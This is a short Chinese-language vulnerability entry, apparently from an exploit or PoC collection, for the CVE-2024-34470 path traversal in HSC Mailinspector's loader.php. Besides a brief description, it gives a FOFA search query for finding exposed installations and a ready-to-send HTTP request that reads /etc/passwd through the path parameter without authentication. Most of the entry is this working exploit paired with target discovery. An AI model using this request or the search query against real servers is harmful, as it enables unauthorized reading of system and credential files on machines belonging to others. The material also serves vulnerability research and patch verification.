## HSC-Mailinspector-loader.php存在任意文件读取漏洞(CVE-2024-34470)

HSC Mailinspector是一款远程电子邮件检查工具，支持POP3/IMAP4协议。它允许用户远程扫描最新邮件，并进行浏览、垃圾邮件排除、编辑、删除等操作，无需实际登录邮箱。由于HSC Mailinspector的/public/loader.php文件存在的路径遍历漏洞，path参数无法正确筛选传递的文件和目录是否为webroot的一部分，从而使未经身份验证的攻击者能够读取服务器上的任意文件。

## fofa

```
body="mailinspector/public"
```

## poc

```
GET /mailinspector/public/loader.php?path=../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406041239536.webp)